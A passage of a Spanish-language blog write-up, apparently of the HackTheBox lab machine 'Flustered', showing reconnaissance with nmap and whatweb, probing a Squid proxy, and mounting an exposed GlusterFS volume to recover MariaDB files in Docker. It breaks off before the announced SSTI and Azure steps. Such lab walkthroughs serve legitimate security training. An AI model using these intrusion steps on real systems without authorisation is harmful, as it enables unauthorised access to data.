<!DOCTYPE html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HTB - Flustered" /><meta property="og:locale" content="es" /><meta name="description" content="Web personal de w0lfst. Encontraras writeups de HackTheBox, apuntes y noticias…" /><meta property="og:description" content="Web personal de w0lfst. Encontraras writeups de HackTheBox, apuntes y noticias…" /><link rel="canonical" href="/posts/flustered/" /><meta property="og:url" content="/posts/flustered/" /><meta property="og:site_name" content="W0lfst" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-16T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB - Flustered" /><meta name="twitter:site" content="@w0lfst_09" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-16T00:00:00+01:00","datePublished":"2022-02-16T00:00:00+01:00","description":"Web personal de w0lfst. Encontraras writeups de HackTheBox, apuntes y noticias…","headline":"HTB - Flustered","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/flustered/"},"url":"/posts/flustered/"}</script><title>HTB - Flustered | W0lfst</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="W0lfst"><meta name="application-name" content="W0lfst"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/perfil.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">W0lfst</a></div><div class="site-subtitle font-italic">Learning Ethical Hacking & Cibersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/w0lfst" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/w0lfst_09" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://app.hackthebox.com/profile/466168" aria-label="htb" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>HTB - Flustered</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Flustered</h1><div class="post-meta text-muted"><div> Por <em> <a href="https://twitter.com/w0lfst_09">W0lfst</a> </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" data-ts="1644966000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-02-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3289 palabras"> <em>18 min</em> de lectura</span></div></div></div><div class="post-content"><p><img data-src="/assets/images/htb/flustered/portada.jpg" alt="" data-proofer-ignore></p><p>Resolución detallada de la maquina Flustered. Veremos las siguientes técnicas:</p><ol><li>Abusing Squid Proxy<li>Abusing GlusterFS<li>Information Leakage<li>Server Side Template Injection (SSTI)[RCE]<li>Abusing Azure Storage</ol><h1 id="reconocimiento">Reconocimiento.</h1><h2 id="comprobación-conexión-y-ttl"><span class="mr-2">Comprobación conexión y TTL.</span><a href="#comprobación-conexión-y-ttl" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Realizamos un ping a la maquina victima para comprobar que tenemos traza ICMP y averiguar el S.O mediante el TTL:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>ping <span class="nt">-c</span> 1 10.10.11.131
<span class="go">PING 10.10.11.131 (10.10.11.131) 56(84) bytes of data.
64 bytes from 10.10.11.131: icmp_seq=1 ttl=63 time=34.1 ms

--- 10.10.11.131 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 34.110/34.110/34.110/0.000 ms
</span></pre></table></code></div></div><p>Tenemos conexión y estamos ante una maquina linux.</p><h2 id="escaneo-de-puertos"><span class="mr-2">Escaneo de puertos.</span><a href="#escaneo-de-puertos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Utilizaremos nmap para escanear todos los puertos que tiene abiertos la maquina victima:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-vvv</span> <span class="nt">-Pn</span> 10.10.11.131 <span class="nt">-oG</span> allPorts
<span class="go">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 22:50 CET
Initiating SYN Stealth Scan at 22:50
Scanning 10.10.11.131 [65535 ports]
Discovered open port 22/tcp on 10.10.11.131
Discovered open port 80/tcp on 10.10.11.131
Discovered open port 111/tcp on 10.10.11.131
Discovered open port 24007/tcp on 10.10.11.131
Discovered open port 49153/tcp on 10.10.11.131
Discovered open port 3128/tcp on 10.10.11.131
Discovered open port 49152/tcp on 10.10.11.131
Completed SYN Stealth Scan at 22:50, 10.42s elapsed (65535 total ports)
Nmap scan report for 10.10.11.131
Host is up, received user-set (0.040s latency).
Scanned at 2022-02-15 22:50:17 CET for 10s
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 63
80/tcp    open  http       syn-ack ttl 63
111/tcp   open  rpcbind    syn-ack ttl 63
3128/tcp  open  squid-http syn-ack ttl 63
24007/tcp open  unknown    syn-ack ttl 63
49152/tcp open  unknown    syn-ack ttl 63
49153/tcp open  unknown    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.56 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
</span></pre></table></code></div></div><blockquote><p>En <a href="https://github.com/w0lfst/Apuntes-Hacking-Etico#-apuntes---hacking-%C3%A9tico-">mis apuntes</a> encontraras mas detalladamente que hace cada parámetro del comando.</p></blockquote><p>Utilizamos la herramienta <a href="https://pastebin.com/tYpwpauW">extractPorts</a> hecha por s4vitar para ver mejor los puertos encontrados y que se copien automáticamente a la clipboard:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>extractPorts allPorts 
<span class="go">
[*] Extracting information...

        [*] IP Address: 10.10.11.131
        [*] Open ports: 22,80,111,3128,24007,49152,49153

[*] Ports copied to clipboard
</span></pre></table></code></div></div><p>Lanzamos un whatweb pero no encontramos gran cosa:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ $</span>whatweb http://10.10.11.131
<span class="go">http://10.10.11.131 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.11.131], Title[steampunk-era.htb - Coming Soon], nginx[1.14.2]
</span></pre></table></code></div></div><h2 id="escaneo-de-servicios-que-corren-cada-puerto"><span class="mr-2">Escaneo de servicios que corren cada puerto.</span><a href="#escaneo-de-servicios-que-corren-cada-puerto" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,111,3128,24007,49152,49153 10.10.11.131 <span class="nt">-oN</span> targeted
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 22:52 CET
Nmap scan report for 10.10.11.131
Host is up (0.052s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
80/tcp    open  http        nginx 1.14.2
|_http-title: steampunk-era.htb - Coming Soon
|_http-server-header: nginx/1.14.2
</span><span class="gp">111/tcp   open  rpcbind     2-4 (RPC #</span>100000<span class="o">)</span>
<span class="go">| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.6
24007/tcp open  rpcbind
49152/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=flustered.htb
| Not valid before: 2021-11-25T15:27:31
|_Not valid after:  2089-12-13T15:27:31
|_ssl-date: TLS randomness does not represent time
49153/tcp open  rpcbind
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.79 seconds
</span></pre></table></code></div></div><div class="table-wrapper"><table><thead><tr><th>Puerto<th>Servicio<th>Version<tbody><tr><td>22<td>ssh<td>OpenSSH 7.9<tr><td>80<td>http<td>nginx 1.14.2<tr><td>111<td>rpcbind<td>2-4<tr><td>3128<td>http-proxy<td>Squid http proxy 4.6<tr><td>24007<td>rpcbind<td>-<tr><td>49152<td>ssl/unknown<td>-<tr><td>49153<td>rpcbind<td>-</table></div><p>Añadimos los dos nombres de dominio encontrados al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. <code class="language-plaintext highlighter-rouge">flustered.htb</code> y <code class="language-plaintext highlighter-rouge">steampunk-era.htb</code>.</p><p>En la web no vemos nada de diferente entre los distintos dominios.</p><h2 id="analizando-proxy"><span class="mr-2">Analizando proxy.</span><a href="#analizando-proxy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Vemos que hay un Squid http proxy 4.6. A lo mejor, tiene un servicio http por el puerto 80 que pasando a traves del proxy nos permita listar un contenido diferente.</p><p>Con curl hay un parámetro que es <code class="language-plaintext highlighter-rouge">--proxy</code> a traves del cual podemos indicar el proxy por el cual podemos pasar y luego tratar de realizar una petición.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">--proxy</span> http://10.10.11.131:3129 http://127.0.0.1
</pre></table></code></div></div><p class="notice--info">Al estar pasando por un proxy estamos haciendo referencia al localhost de la maquina victima y no al nuestro.</p><p>Si ejecutamos el comando anterior vemos cosas, pero, nos pone <code class="language-plaintext highlighter-rouge">access denied</code> porque necesitamos autenticarnos.</p><h2 id="glusterfs"><span class="mr-2">GlusterFS.</span><a href="#glusterfs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Seguimos analizando mas puertos, por ejemplo, el 24007. Esto es GlusterFS (FileSystem)</p><p>Vamos a instalarnos <code class="language-plaintext highlighter-rouge">glusterfs-client</code> y <code class="language-plaintext highlighter-rouge">glusterfs-server</code> para analizar el servicio.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>gluster <span class="nt">--remote-host</span><span class="o">=</span>10.10.11.131 volume list
<span class="go">vol1
vol2
</span></pre></table></code></div></div><p>Nos reporta que hay dos volúmenes. A continuación, montaremos el <code class="language-plaintext highlighter-rouge">vol1</code> para ver que contiene. Creamos una carpeta en <code class="language-plaintext highlighter-rouge">/mnt</code>, en mi caso, sera <code class="language-plaintext highlighter-rouge">/mnt/flustered</code>. Ejecutamos la montura:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]
</span><span class="gp">└──╼ #</span>mount <span class="nt">-t</span> glusterfs 10.10.11.131:/vol1 /mnt/flustered/
<span class="go">Mount failed. Check the log file  for more details.
</span></pre></table></code></div></div><p>Se produce un error, analicemos el log <code class="language-plaintext highlighter-rouge">/var/log/glusterfs/mnt-flustered.log</code>…</p><p>Nos da un problema de DNS, no logra saber que es <code class="language-plaintext highlighter-rouge">flustered</code>. Para solucionar este problema nos iremos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y añadiremos el host <code class="language-plaintext highlighter-rouge">flustered</code>. Volvemos a ejecutar el comando, pero, nos da otro error distinto.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>0-vol1-client-0: could not load our cert at /etc/ssl/glusterfs.pem
</pre></table></code></div></div><p>Esta buscando certificados en el <code class="language-plaintext highlighter-rouge">/etc/ssl</code> de nuestro equipo, en este caso, poco podemos hacer ya que no tenemos ese fichero.</p><p>Probamos con el vol2 y esto es lo que vemos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/mnt/flustered]
</span><span class="gp">└──╼ #</span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 122938
drwx------ 6 Debian-exim ntp      4096 oct 25 14:52 .
drwxr-xr-x 1 root        root       18 feb 15 23:13 ..
-rw-rw---- 1 Debian-exim ntp     16384 oct 25 14:52 aria_log.00000001
-rw-rw---- 1 Debian-exim ntp        52 oct 25 14:52 aria_log_control
-rw-r--r-- 1 root        root        0 oct 25 14:43 debian-10.3.flag
-rw-rw---- 1 Debian-exim ntp       998 ene 28 12:23 ib_buffer_pool
-rw-rw---- 1 Debian-exim ntp  12582912 oct 25 14:52 ibdata1
-rw-rw---- 1 Debian-exim ntp  50331648 oct 25 14:52 ib_logfile0
-rw-rw---- 1 Debian-exim ntp  50331648 oct 25 14:37 ib_logfile1
-rw-rw---- 1 Debian-exim ntp  12582912 feb 15 15:59 ibtmp1
-rw-rw---- 1 Debian-exim ntp         0 oct 25 14:43 multi-master.info
drwx------ 2 Debian-exim ntp      4096 oct 25 14:43 mysql
-rw-rw---- 1 root        root       16 oct 25 14:43 mysql_upgrade_info
drwx------ 2 Debian-exim ntp      4096 oct 25 14:43 performance_schema
drwx------ 2 Debian-exim ntp      4096 oct 25 14:44 squid
-rw-rw---- 1 Debian-exim ntp     24576 feb 15 15:59 tc.log
</span></pre></table></code></div></div><p>Abrimos mysql_upgrade_info:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/mnt/flustered]
</span><span class="gp">└──╼ #</span>strings mysql_upgrade_info
<span class="go">10.3.31-MariaDB
</span></pre></table></code></div></div><h2 id="docker-mysql"><span class="mr-2">Docker mysql.</span><a href="#docker-mysql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Montaremos un docker con esta versión de mysql y meteremos todos estos archivos para ver las bases de datos. Seguimos los siguientes pasos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/tmp]
</span><span class="gp">└──╼ #</span><span class="nb">mkdir </span>mysql
<span class="go">┌─[root@h4cknet]─[/tmp]
</span><span class="gp">└──╼ #</span><span class="nb">cd</span> <span class="o">!</span><span class="err">$</span>
<span class="go">cd mysql
┌─[root@h4cknet]─[/tmp/mysql]
</span><span class="gp">└──╼ #</span><span class="nb">cp</span> <span class="nt">-R</span> /mnt/flustered/<span class="k">*</span> <span class="nb">.</span>
<span class="go">┌─[root@h4cknet]─[/tmp/mysql]
</span><span class="gp">└──╼ #</span>docker run <span class="nt">--name</span> mariadb <span class="nt">-v</span> /tmp/mysql:/var/lib/mysql <span class="nt">-d</span> mariadb:10.3.31
<span class="go">Unable to find image 'mariadb:10.3.31' locally
10.3.31: Pulling from library/mariadb
7b1a6ab2e44d: Pull complete 
034655750c88: Pull complete 
f0b757a2a0f0: Pull complete 
5c37daf8b6b5: Pull complete 
b4cd9409b0f6: Pull complete 
dbcda06785eb: Pull complete 
a34cd90f184c: Pull complete 
55c0df9b2fca: Pull complete 
e2a4d476ce21: Pull complete 
6592280ea514: Pull complete 
0ede5dfe32b4: Pull complete 
Digest: sha256:22834b9671a1e89b74e0cc0bc285fd33425ba2641afe86cb3afd5d8617245b81
Status: Downloaded newer image for mariadb:10.3.31
cfe8a82e69fe7de0a4da4e8ba077a7020382c1a5928b941fb6a43e4e07be7d1
┌─[root@h4cknet]─[/tmp/mysql]
</span><span class="gp">└──╼ #</span>docker images
<span class="go">REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
mariadb      10.3.31   439df5ac9582   4 months ago   386MB
</span></pre></table></code></div></div><p class="notice--info">A la hora de desplegar el contenedor todo lo que hay en mysql en <code class="language-plaintext highlighter-rouge">/tmp/mysql</code> me lo va a montar en <code class="language-plaintext highlighter-rouge">/var/lib/mysql</code> del contenedor (“maquina victima”). Con el parámetro <code class="language-plaintext highlighter-rouge">-d</code> indicamos la version exacta de mariadb que queremos utilizar.</p><p>Trataremos de forma interactiva obtener una bash de mariadb y comprobar que todo esta bien:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/tmp/mysql]
</span><span class="gp">└──╼ #</span>docker <span class="nb">exec</span> <span class="nt">-it</span> mariadb bash
<span class="gp">root@cfe8a82e69fe:/#</span><span class="w"> </span><span class="nb">hostname</span> <span class="nt">-I</span> 
<span class="go">172.17.0.2
</span><span class="gp">root@cfe8a82e69fe:/#</span><span class="w"> </span><span class="nb">ls</span> /var/lib/mysql/
<span class="go">aria_log.00000001  debian-10.3.flag  ib_logfile0  ibdata1  multi-master.info  mysql_upgrade_info  squid
aria_log_control   ib_buffer_pool    ib_logfile1  ibtmp1   mysql              performance_schema  tc.lo
</span></pre></table></code></div></div><p>Estamos en el docker y podemos ver los archivos que hemos indicado anteriormente para que se copiaran.</p><p>Si intentamos lanzar un mysql en vez de una bash nos da el siguiente error:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">┌─[root@h4cknet]─[/tmp/mysql]
</span><span class="gp">└──╼ #</span>docker <span class="nb">exec</span> <span class="nt">-it</span> mariadb mysql
<span class="go">ERROR 1524 (HY000): Plugin 'unix_socket' is not loa
</span></pre></table></code></div></div><p>Solucionemos este problema. En la ruta <code class="language-plaintext highlighter-rouge">/etc/mysql/mariadb.conf.d</code> crearemos el siguiente archivo:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">root@cfe8a82e69fe:/etc/mysql/mariadb.conf.d#</span><span class="w"> </span>nano socket.cnf
<span class="gp">root@cfe8a82e69fe:/etc/mysql/mariadb.conf.d#</span><span class="w"> </span><span class="nb">cat </span>socket.cnf 
<span class="go">[mariadb]
plugin-load-add = auth_socket.so
</span><span class="gp">root@cfe8a82e69fe:/etc/mysql/mariadb.conf.d#</span><span class="w"> 
